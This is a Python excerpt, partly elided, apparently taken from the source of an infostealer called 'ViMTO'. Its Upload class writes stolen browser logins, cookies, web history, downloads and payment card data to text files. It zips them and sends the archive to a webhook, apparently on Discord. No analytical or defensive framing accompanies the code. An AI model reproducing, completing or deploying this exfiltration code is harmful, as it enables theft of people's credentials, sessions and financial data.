...
class Upload:
    ...
    def write_files(self):
        os.makedirs("ViMTO", exist_ok=True)
        if __LOGINS__:
            with open("ViMTO\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("ViMTO\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("ViMTO\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("ViMTO\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("ViMTO\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("ViMTO.zip", "w") as zip:
            for file in os.listdir("ViMTO"):
                zip.write(f"ViMTO\\{file}", file)

    def send(self):
        self.webhook.send(
            embed=Embed(
                title="ViMTO",
                description="```" + '\n'.join(self.tree(Path("ViMTO"))) + "```",
            ),
            file=File("ViMTO.zip"),
        )
